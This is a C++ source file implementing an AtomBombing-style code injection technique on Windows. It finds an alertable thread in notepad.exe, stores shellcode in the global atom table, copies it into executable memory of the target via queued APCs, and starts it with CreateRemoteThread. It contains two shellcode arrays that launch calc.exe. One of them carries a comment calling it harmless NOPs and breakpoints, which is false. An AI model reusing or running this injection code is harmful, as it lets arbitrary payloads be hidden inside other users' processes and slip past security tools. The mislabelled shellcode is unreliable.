#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <winternl.h>

#include <stdlib.h>

typedef NTSTATUS(NTAPI* PFN_NtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3
    );

// 错误状态定义
#define ESTATUS_INVALID_HANDLE          0x1001
#define ESTATUS_THREAD_ENUM_FAILURE     0x1002

HANDLE FindAlertableThread(HANDLE hProcess, DWORD dwProcessId, PHANDLE phAlertableThread) 
{
    HANDLE hAlertableThread = NULL;
    HANDLE* phThreads = NULL;
    DWORD dwThreadCount = 0;

    // PHANDLE phLocalEvents = NULL;

    // 获取函数地址
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");

    PFN_NtQueueApcThread pNtQueueApcThread =
        (PFN_NtQueueApcThread)GetProcAddress(hNtdll, "NtQueueApcThread");
    PVOID pWaitForSingleObjectEx =
        (PVOID)GetProcAddress(hKernel32, "WaitForSingleObjectEx");
    PVOID pSetEvent =
        (PVOID)GetProcAddress(hKernel32, "SetEvent");

    if (!pNtQueueApcThread || !pWaitForSingleObjectEx || !pSetEvent) {
        return NULL;
    }

    // 1. 枚举进程线程
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te32 = { sizeof(te32) };
    Thread32First(hSnapshot, &te32);

    // 收集目标进程的线程
    do {
        if (te32.th32OwnerProcessID == dwProcessId) {
            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
            if (hThread) {
                phThreads = (PHANDLE)realloc(phThreads, (dwThreadCount + 1) * sizeof(HANDLE));
                phThreads[dwThreadCount++] = hThread;
            }
        }
    } while (Thread32Next(hSnapshot, &te32));
    CloseHandle(hSnapshot);

    PVOID pfnWaitForSingleObjectEx = GetProcAddress(
        GetModuleHandleW(L"kernel32.dll"),
        "WaitForSingleObjectEx");

    // 2. 给所有线程注入 WaitForSingleObjectEx APC
    for (DWORD i = 0; i < dwThreadCount; i++) 
    {
        pNtQueueApcThread(
            phThreads[i],
            pfnWaitForSingleObjectEx,
            GetCurrentThread(),
            (PVOID)5000,
            (PVOID)TRUE
        );
    }

    // Step 2: 创建本地事件数组，并复制到目标进程中
    HANDLE* localEvents = (HANDLE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwThreadCount * sizeof(HANDLE));
    HANDLE* remoteEvents = (HANDLE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwThreadCount * sizeof(HANDLE));

    if (!localEvents || !remoteEvents) 
    {
        HeapFree(GetProcessHeap(), 0, phThreads);
        return NULL;
    }

    // 4. 为每个线程创建事件并注入 SetEvent APC
    for (DWORD i = 0; i < dwThreadCount; i++) {
        localEvents[i] = CreateEvent(NULL, TRUE, FALSE, NULL);

        DuplicateHandle(GetCurrentProcess(),
            localEvents[i],
            hProcess,
            &remoteEvents[i],
            0,
            FALSE,
            DUPLICATE_SAME_ACCESS);

        // 注入 SetEvent APC
        SuspendThread(phThreads[i]);
        QueueUserAPC((PAPCFUNC)SetEvent, phThreads[i], (ULONG_PTR)remoteEvents[i]);

        // 注入保持 Alertable 的 APC
        pNtQueueApcThread(
            phThreads[i],
            pfnWaitForSingleObjectEx,
            GetCurrentThread(),
            (PVOID)5000,
            (PVOID)TRUE
        );

        ResumeThread(phThreads[i]);
    }

    // 4. 等待任意事件触发
    DWORD waitResult = WaitForMultipleObjects(
        dwThreadCount, 
        localEvents, 
        FALSE, 
        6000
    );

    if (
        waitResult >= WAIT_OBJECT_0 && 
        waitResult < WAIT_OBJECT_0 + dwThreadCount
        ) 
    {
        // 找到alertable线程，复制句柄
        DuplicateHandle(
            GetCurrentProcess(), 
            phThreads[waitResult - WAIT_OBJECT_0],
            GetCurrentProcess(), 
            &hAlertableThread,
            0, 
            FALSE, 
            DUPLICATE_SAME_ACCESS
        );

        // 保持该线程的alertable状态 (无限等待)
        pNtQueueApcThread(
            hAlertableThread,
            pWaitForSingleObjectEx,
            GetCurrentThread(),
            (PVOID)INFINITE,    // 无限等待
            (PVOID)TRUE
        );
    }


    if (waitResult != WAIT_FAILED && waitResult != WAIT_TIMEOUT) 
    {
        // 6. 找到 alertable 线程,保持其状态
        HANDLE hAlertableThread = phThreads[waitResult - WAIT_OBJECT_0];

        pNtQueueApcThread(hAlertableThread,
            pfnWaitForSingleObjectEx,
            GetCurrentThread(),
            (PVOID)INFINITE,
            (PVOID)TRUE);

        *phAlertableThread = hAlertableThread;

        // 清理资源
        for (DWORD i = 0; i < dwThreadCount; i++) 
        {
            if (i != (waitResult - WAIT_OBJECT_0)) {
                CloseHandle(phThreads[i]);
            }
            CloseHandle(localEvents[i]);
        }
        //free(phThreads);
        //free(localEvents);
        //free(remoteEvents);

        // return TRUE;
    }
}




// Dummy shellcode (safe) - NOPs + INT3 (breakpoint)
UCHAR shellcode_00[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
    0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
    0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
    0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
    0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
    0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
    0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
    0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
    0x65, 0x78, 0x65, 0x00
};

unsigned char shellcode[] = {
    // 构建"calc.exe"字符串到栈上
    0x48, 0x31, 0xC0,               // xor rax, rax
    0x50,                           // push rax        ; null terminator
    0x68, 0x2E, 0x65, 0x78, 0x65,   // push "exe."
    0x68, 0x63, 0x61, 0x6C, 0x63,   // push "calc"

    // 设置参数并调用
    0x48, 0x89, 0xE1,               // mov rcx, rsp    ; 第一个参数
    0x6A, 0x01,                     // push 1          ; SW_SHOWNORMAL
    0x5A,                           // pop rdx         ; 第二个参数

    // 调用WinExec
    0x48, 0xB8,                     // mov rax,
    0xEF, 0xBE, 0xAD, 0xDE,        // WinExec地址
    0xEF, 0xBE, 0xAD, 0xDE,        // (需要填充)
    0x48, 0xF7, 0xD0,               // not rax
    0xFF, 0xD0                      // call rax
};



// Helper: Find target process by name
DWORD FindTargetProcess(const char* procName) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32First(snapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, procName) == 0) {
                CloseHandle(snapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe32));
    }

    CloseHandle(snapshot);
    return 0;
}

// Helper: Get a thread handle in target process
HANDLE GetRemoteThreadHandle(DWORD pid) {
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return NULL;

    if (Thread32First(snapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                printf("thread id => %d\n", te32.th32ThreadID);
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te32.th32ThreadID);
                if (hThread != NULL) {
                    CloseHandle(snapshot);
                    return hThread;
                }
            }
        } while (Thread32Next(snapshot, &te32));
    }

    CloseHandle(snapshot);
    return NULL;
}

int AtombombingExecute()
{
    NTSTATUS status = NULL;

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    UINT64 WinExecAddr = (UINT64)GetProcAddress(hKernel32, "WinExec");

    // 填充WinExec地址
    *(UINT64*)(shellcode + 22) = ~WinExecAddr;


    // 需要先load这个，否则 GlobalAddAtomA 返回错误：5
    LoadLibraryA("user32.dll");
    // Step 1: Store shellcode in global atom table
    ATOM atom = GlobalAddAtomW((LPCWSTR)shellcode);
    if (atom == 0) {
        std::cerr << "[!] Failed to add atom. Error: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[+] Atom created with ID: 0x" << std::hex << atom << std::endl;

    // Step 2: Find target process (e.g., notepad.exe)
    DWORD pid = FindTargetProcess("notepad.exe");
    //DWORD pid = FindTargetProcess("chrome.exe");
    if (pid == 0) {
        std::cerr << "[!] Target process not found." << std::endl;
        return 1;
    }
    std::cout << "[+] Found notepad.exe with PID: " << pid << std::endl;
    
    HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // Step 3: Get remote thread handle
    //HANDLE hThread = GetRemoteThreadHandle(pid);
    HANDLE hThread = NULL;
    FindAlertableThread(hTargetProcess, pid, &hThread);
    if (!hThread) {
        std::cerr << "[!] Failed to get remote thread handle." << std::endl;
        return 1;
    }
    std::cout << "[+] Got remote thread handle." << std::endl;

    //SuspendThread(hThread);

    // Step 4: Get address of GlobalGetAtomNameA
    FARPROC pGlobalGetAtomNameW = GetProcAddress(GetModuleHandleA("kernel32.dll"), "GlobalGetAtomNameW");
    if (!pGlobalGetAtomNameW) {
        std::cerr << "[!] Failed to get GlobalGetAtomNameA address." << std::endl;
        return 1;
    }

    // Step 5: Queue APC to call GlobalGetAtomNameA with shellcode Atom
    typedef NTSTATUS(NTAPI* NtQueueApcThread_t)(
        HANDLE, PVOID, PVOID, PVOID, PVOID);

    NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueueApcThread");

    LPVOID pWaitForSingleObjectEx = GetProcAddress(GetModuleHandleA("kernel32.dll"), "WaitForSingleObjectEx");

    if (!pNtQueueApcThread) {
        std::cerr << "[!] Failed to get NtQueueApcThread address." << std::endl;
        return 1;
    }

    
    LPVOID rmShellcodeAddr = VirtualAllocEx(hTargetProcess, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    status = pNtQueueApcThread(
        hThread,
        (PVOID)pGlobalGetAtomNameW,
        (PVOID)(UINT_PTR)atom,
        rmShellcodeAddr,
        //NULL,
        (PVOID)sizeof(shellcode)
    );

    if (status != 0) {
        std::cerr << "[!] Failed to queue APC. Status: " << std::hex << status << std::endl;
        return 1;
    }

    CreateRemoteThread(hTargetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rmShellcodeAddr, NULL, 0, NULL);


    std::cout << "[+] APC queued successfully!" << std::endl;


    std::cout << "[+] Thread resumed. Shellcode should execute now (INT3)." << std::endl;

    CloseHandle(hThread);
    return 0;
}